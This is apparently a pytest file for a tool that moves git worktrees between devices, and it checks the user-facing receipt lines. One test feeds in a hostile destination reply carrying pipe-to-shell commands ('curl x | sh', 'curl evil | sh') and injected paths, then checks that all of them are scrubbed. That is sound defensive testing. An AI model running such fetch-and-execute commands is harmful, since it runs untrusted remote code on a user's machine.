"""The receipt sentences for a move that CARRIED its working set (PR B, design §11.2).

The operator's addition (2026-11-18): the user must be confident which device holds
the work. A receipt that only says "moved" would leave them guessing, so each fact is
its own line: what was restored and where, the dependency recipe to run (listed, never
run), what is still waiting, and what stayed on the source and why — rendered from
catalogue keys, with engine reason codes folded onto one user-facing sentence.
"""

from __future__ import annotations

from typing import Any

import pytest

from local_operator.network import workset_text


@pytest.fixture(autouse=True)
def _english(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("LOP_LANGUAGE", "en")
    monkeypatch.setenv("LANG", "en_US.UTF-8")


BLOCK = {
    "transferred": True,
    "state": "pending_restore",
    "source": {"device_id": "d_a", "name": "laptop"},
    "worktrees": [
        {
            "path": "~/proj/.worktrees/feat",
            "state": "restored",
            "dest_path": "~/proj/.worktrees/feat.moved-laptop-202611181200",
            "recipes": [{"kind": "pnpm", "run": "pnpm install --frozen-lockfile", "cwd": "~/x"}],
        },
        {"path": "~/proj/.worktrees/wip", "state": "pending_restore", "reason": "artifact_missing"},
        {"path": "~/other", "state": "left_behind", "reason": "unborn_head"},
        {"path": "~/third", "state": "left_behind", "reason": "history_secret"},
    ],
    "notes": ["~/proj: git@github.com:o/r.git -> https://github.com/o/r.git"],
}


def test_a_carried_working_set_says_where_each_worktree_is() -> None:
    lines = workset_text.receipt_lines(BLOCK, source="fallback")

    assert lines[0] == "Working files arrived from laptop: 1 worktree restored here."
    assert (
        "Restored ~/proj/.worktrees/feat at ~/proj/.worktrees/feat.moved-laptop-202611181200."
        in lines
    )
    assert "To recreate its dependencies, run in ~/x: pnpm install --frozen-lockfile" in lines
    assert any(line.startswith("1 worktree is not restored yet") for line in lines), lines
    # Engine codes fold onto one sentence; a known reason keeps its own.
    other = next(line for line in lines if line.startswith("~/other stayed on laptop"))
    assert "unborn_head" not in other
    assert any(line.startswith("~/third stayed on laptop:") for line in lines)
    assert any("https://github.com/o/r.git" in line for line in lines)


def test_a_move_that_did_not_carry_keeps_the_pr_a_sentence() -> None:
    block = {"transferred": False, "consent": "confirmed", "worktrees": [{"state": "left_behind"}]}
    lines = workset_text.receipt_lines(block, source="laptop")
    # The headline is PR A's; #4241's receipt then LISTS what stayed (its QA Q-2).
    assert lines[0] == "Working files were not transferred: 1 worktree stays on laptop."
    assert len(lines) == 2 and "stays on laptop" in lines[1]


# ---------------------------------------------------------------------------
# The SOURCE's offload receipt (#4245): the destination's answer, scrubbed
# ---------------------------------------------------------------------------


def _planned() -> dict[str, Any]:
    return {
        "transferred": False,
        "state": "transferring",
        "consent": "confirmed",
        "source": {"name": "A"},
        "destination": {"name": "B"},
        "worktrees": [
            {"path": "~/proj/.worktrees/feat", "state": "planned"},
            {"path": "~/proj/.worktrees/other", "state": "planned"},
        ],
    }


def test_the_source_receipt_with_no_destination_answer_says_check_there_not_stayed() -> None:
    from local_operator.network import workset_move

    block = workset_move.source_receipt(_planned(), None)

    assert block["state"] == "outcome_unknown" and "transferred" not in block
    text = "\n".join(workset_text.receipt_lines(block, source="A"))
    assert "check on B" in text and "stay" not in text, text


def test_the_source_receipt_keeps_only_closed_states_on_its_own_rows() -> None:
    """A hostile destination cannot add a row, a path, a command or free text: only
    a closed state on a row this device itself sent, and a reason from the table."""
    from local_operator.network import workset_move

    answer = {
        "transferred": True,
        "worktrees": [
            {
                "path": "~/proj/.worktrees/feat",
                "state": "restored",
                "dest_path": "/evil",
                "recipes": [{"run": "curl x | sh", "cwd": "/"}],
            },
            {
                "path": "~/proj/.worktrees/other",
                "state": "left_behind",
                "reason": "run: curl evil | sh",
            },
            {"path": "/injected", "state": "restored"},
        ],
    }

    block = workset_move.source_receipt(_planned(), answer)

    rows = {r["path"]: r for r in block["worktrees"]}
    assert set(rows) == {"~/proj/.worktrees/feat", "~/proj/.worktrees/other"}
    assert rows["~/proj/.worktrees/feat"] == {"path": "~/proj/.worktrees/feat", "state": "restored"}
    assert rows["~/proj/.worktrees/other"]["reason"] == "not_transferred"
    text = "\n".join(workset_text.receipt_lines(block, source="A"))
    assert "curl" not in text and "/evil" not in text and "/injected" not in text, text
    assert "went to B" in text and "~/proj/.worktrees/other stayed on A" in text, text


def test_the_destination_outcome_carries_rows_only() -> None:
    from local_operator.network import workset_move

    out = workset_move.destination_outcome(
        {
            "state": "transferring",
            "notes": ["x"],
            "scope_digest": "sha256:" + "0" * 64,
            "worktrees": [{"path": "~/p", "state": "planned", "recipes": [{"run": "x"}]}],
        }
    )

    assert out == {"transferred": True, "worktrees": [{"path": "~/p", "state": "transferred"}]}


def test_the_destination_outcome_reports_its_own_declines_as_left_behind() -> None:
    """Review round 3, B2: a planned row the destination did not take reads
    ``left_behind`` with the journaled coarse code, never ``transferred``."""
    from local_operator.network import workset_move

    out = workset_move.destination_outcome(
        {"worktrees": [{"path": "~/p", "state": "planned"}, {"path": "~/q", "state": "planned"}]},
        {"~/q": "restore_path_refused"},
    )

    assert out == {
        "transferred": True,
        "worktrees": [
            {"path": "~/p", "state": "transferred"},
            {"path": "~/q", "state": "left_behind", "reason": "restore_path_refused"},
        ],
    }


def test_a_source_receipt_with_nothing_sent_says_the_files_stayed() -> None:
    """Review round 3, m1: every row came back ``left_behind`` — the headline said
    "0 worktrees received there"; it is the stayed headline now."""
    from local_operator.network import workset_move

    answer = {
        "transferred": True,
        "worktrees": [
            {
                "path": "~/proj/.worktrees/feat",
                "state": "left_behind",
                "reason": "too_many_worktrees",
            },
            {
                "path": "~/proj/.worktrees/other",
                "state": "left_behind",
                "reason": "destination_declined",
            },
        ],
    }

    block = workset_move.source_receipt(_planned(), answer)

    text = "\n".join(workset_text.receipt_lines(block, source="A"))
    assert "received there" not in text and "0 worktrees" not in text, text
    assert "2 worktrees stay on A" in text, text
    assert "~/proj/.worktrees/feat stayed on A" in text, text
